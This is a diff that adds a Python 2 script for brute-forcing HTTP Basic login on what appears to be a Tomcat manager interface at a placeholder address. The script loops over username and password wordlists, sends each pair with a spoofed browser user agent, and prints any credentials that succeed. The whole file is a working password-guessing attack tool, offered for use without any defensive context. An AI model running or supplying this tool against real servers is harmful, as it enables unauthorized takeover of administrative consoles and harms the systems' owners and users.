@@ -1,0 +1,32 @@
+import urllib
+import urllib2
+import time
+import base64
+
+def mgr_login(url):
+    names = open("u.txt","r")
+    for name in names.readlines():
+        username = name.strip().split('\t')
+        # print " ".join(username)
+        passwds = open("p.txt", "r")
+        for passwd in passwds.readlines():
+            password = passwd.strip().split('\t')
+            user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
+            Authorization = "Basic %s" % (base64.b64encode(" ".join(username)+ ':' + " ".join(password)))
+            header = {'User-Agent': user_agent, 'Authorization': Authorization}
+            try:
+                request = urllib2.Request(url, headers=header)
+                response = urllib2.urlopen(request, timeout=5)
+
+                if response.code == 200:
+                    print '[Success]' + url + ' ' + " ".join(username) + ':' + " ".join(password)
+                    break
+            except:
+                print '[False] ' + url + ' ' + " ".join(username)+ ':' + " ".join(password)
+                time.sleep(1)
+    passwds.close()
+    names.close()
+
+if __name__ == '__main__':
+    mgr_login('http://X.X.X.X/manager/html')
+
